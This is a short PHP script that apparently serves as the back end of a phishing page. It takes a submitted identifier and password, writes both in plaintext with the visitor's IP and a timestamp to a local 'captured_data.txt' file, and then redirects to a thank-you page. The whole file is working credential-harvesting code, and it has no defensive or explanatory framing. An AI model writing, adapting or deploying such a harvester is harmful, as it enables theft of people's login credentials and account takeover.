<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit;
}


$identifier = $_POST['identifier'] ?? '';
$password   = $_POST['password'] ?? '';
$identifier = str_replace(["\r", "\n", "|"], ' ', trim($identifier));
$password   = str_replace(["\r", "\n", "|"], ' ', trim($password));

if ($identifier === '' || $password === '') {
    header('Location: index.html');
    exit;
}

$timestamp = date('Y-m-d H:i:s');
$ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$logLine   = "[$timestamp] IP=$ip | identifier=$identifier | password=$password" . PHP_EOL;

// Where captured data is stored locally.
$logFile = __DIR__ . '/captured_data.txt';
file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);

header('Location: thankyou.html');
exit;

?>